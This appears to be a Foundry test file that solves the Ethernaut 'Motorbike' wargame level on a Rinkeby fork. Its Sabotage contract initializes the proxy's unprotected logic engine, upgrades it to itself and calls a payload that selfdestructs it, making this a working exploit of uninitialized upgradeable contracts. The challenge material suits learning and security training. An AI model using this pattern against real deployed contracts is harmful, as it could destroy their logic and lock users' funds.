// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;

import "forge-std/Test.sol";
import "../src/Motorbike.sol";

contract SolutionTest is Test {
    uint rinkebyFork;
    string RINKEBY_RPC_URL = vm.envString("RINKEBY_RPC_URL");

    function setUp() public {
        rinkebyFork = vm.createFork(RINKEBY_RPC_URL);
    }

    function test() public {
        vm.selectFork(rinkebyFork);
        assertEq(vm.activeFork(), rinkebyFork);

        Motorbike instance = Motorbike(0xCFB8B46984455f90dE7C2471898fa25d4aDd2545);
        Engine engine = Engine(0x10F97fA91a64FC5c6424b80EE87c14C181f8293A);
        Sabotage sabotage = new Sabotage(address(instance), address(engine));

        sabotage.sugarInYourEngine();
    }
}

contract Sabotage {

    Motorbike instance;
    Engine engine;
    
    constructor(address payable $your_ethernaut_instance_here, address $your_sleuthed_logic_engine_here) public {
        instance = Motorbike($your_ethernaut_instance_here);
        engine = Engine($your_sleuthed_logic_engine_here);
    }

    function sugarInYourEngine() public {
        // become upgrader by initializing logic engine
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSignature("payload()"));
    }

    function payload() public {
        selfdestruct(0x000000000000000000000000000000000000dEaD);
    }

    // this function may not actually return 0 even if the engine is successfully self destructed in the case that it is called within the same tx; call it in a separate tx
    function inspectDamage() public returns (uint) {
        uint256 size;
        address _engine = address(engine);
        assembly {
            size := extcodesize(_engine)
        }
        return size;
    }
}
